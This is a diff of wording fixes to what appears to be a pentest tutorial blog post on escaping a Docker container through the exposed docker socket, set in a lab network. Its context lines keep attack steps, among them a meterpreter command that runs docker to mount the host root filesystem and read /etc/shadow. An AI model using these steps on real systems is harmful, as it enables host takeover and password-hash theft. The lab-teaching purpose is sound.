@@ -6,8 +6,8 @@ tags: ["docker", "pentest", "attack"]
 ---
 
 Is possible to abuse and escape from containers in several scenarios, in this
-post I will explore the most basic one, that is abusing the docker socket to
-escape the container and run code as *root* in the host machine.
+post I will explore the most basic one: abusing the docker socket to escape the
+container and run code as *root* in the host machine.
 
 <!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->
 **Table of Contents**
@@ -29,7 +29,7 @@ Since we will be using containers, you have to install
 ### Create the network
 
 The very first step is to create a docker network where those containers will be
-created, so they can tak with each other:
+created, so they can talk with each other:
 
 ``` shell
 docker network create pwnage 
@@ -78,8 +78,8 @@ After it is loaded you will be presented to this screen
 
 ## Information gathering
 
-In any attack, the very first step is to gather information about the target. So
-let's first check the connectivity by pinging the **vulnerable** container.
+In any attack, the first thing to do is to gather information about the target.
+So let's first check the connectivity by pinging the **vulnerable** container.
 
 ``` shell
 ping -c 2 vulnerable 
@@ -199,7 +199,7 @@ explaining them was extracted from the official docker documentation:
 You can access devices with `--device`, but in our case, we will map the root
 file system (`/`) to the container and have access to it.
 
-Since there is no docker client inside this container, the very first step is to
+Since there is no docker client inside this container, the next step is to
 setup the docker client and its dependencies inside our target container. Just
 run the command bellow and everything will be done.
 
@@ -228,13 +228,13 @@ meterpreter > chmod +x /docker
 meterpreter > 
 ```
 
-And finally using docker to have access to the host file system.
+And finally, using docker to have access to the host file system.
 
 ``` shell
 execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
 ```
 
-And that is it, you escaped the container and dumped the machine local user
+And that is it, you've escaped the container and dumped the machine local user
 hashes, the output will look like:
 
 ``` shell
